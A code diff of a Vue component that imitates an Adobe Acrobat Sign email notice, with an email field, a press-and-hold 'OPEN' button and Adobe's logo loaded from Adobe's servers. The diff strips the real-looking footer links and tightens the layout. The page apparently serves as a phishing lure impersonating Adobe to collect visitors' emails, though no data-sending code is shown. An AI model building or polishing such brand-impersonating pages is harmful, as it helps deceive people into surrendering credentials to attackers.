@@ -18,23 +18,15 @@
         <button @mousedown="startHold" @mouseup="endHold" @mouseleave="cancelHold">OPEN</button>
         <div class="divider"></div>
         <p class="footer-text">
-          Attached is the final agreement for your reference. Read it with
-          <a href="#">Acrobat Reader</a>. You can also <a href="#">open it online</a> to review its activity history.
-        </p>
-      </div>
-      <div class="global-footer">
-        <p><strong>Powered by</strong></p>
-        <img class="footer-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-sign-logo.3@2x.png" alt="Adobe Sign Logo" />
-        <p>Need your own documents signed? Adobe Acrobat Sign can help save you time. <a href="#">Learn more</a>.</p>
-        <p>To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book.</p>
-        <p>Terms of Use | Report Abuse</p>
-        <p>© 2025 Adobe. All rights reserved.</p>
+          © 2025 Adobe. All rights reserved.
+          
       </div>
     </div>
   </div>
 </template>
 
 <script setup>
+
 import { ref } from 'vue'
 
 const email = ref('')
@@ -91,6 +83,7 @@ function cancelHold() {
   if (holdTimer.value) clearTimeout(holdTimer.value)
   loading.value = false
 }
+
 </script>
 
 <style scoped>
@@ -100,7 +93,7 @@ function cancelHold() {
   background-color: #f4f4f4;
 }
 .adobe-sign-container {
-  max-width: 600px;
+  max-width: 350px;
   margin: auto;
   background: white;
   border-radius: 10px;
@@ -121,7 +114,7 @@ function cancelHold() {
   margin-right: 0.5rem;
 }
 .email-input {
-  width: 100%;
+  width: 90%;
   padding: 0.5rem;
   margin: 1rem 0;
   border: 1px solid #ccc;
@@ -134,7 +127,7 @@ button {
   border: none;
   border-radius: 5px;
   cursor: pointer;
-  width: 100%;
+  width: 95%;
 }
 button:hover {
   background-color: #003a91;
